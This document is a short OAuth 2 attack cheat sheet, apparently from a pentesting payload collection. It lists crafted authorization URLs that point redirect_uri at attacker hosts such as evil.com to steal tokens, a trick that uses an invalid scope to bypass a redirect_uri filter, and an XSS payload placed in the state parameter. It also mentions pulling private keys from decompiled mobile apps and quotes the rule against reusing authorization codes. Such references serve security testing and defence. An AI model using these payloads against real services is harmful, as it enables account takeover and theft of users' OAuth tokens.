# OAuth 2 - Common vulnerabilities

## Grabbing OAuth Token via redirect_uri
```
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```
Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
```
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## Executing XSS via redirect_uri
```
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth private key disclosure
Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.

## Authorization Code Rule Violation
```
The client MUST NOT use the authorization code  more than once.  
If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.
```

## Thanks to
* http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html
* http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html
* http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html
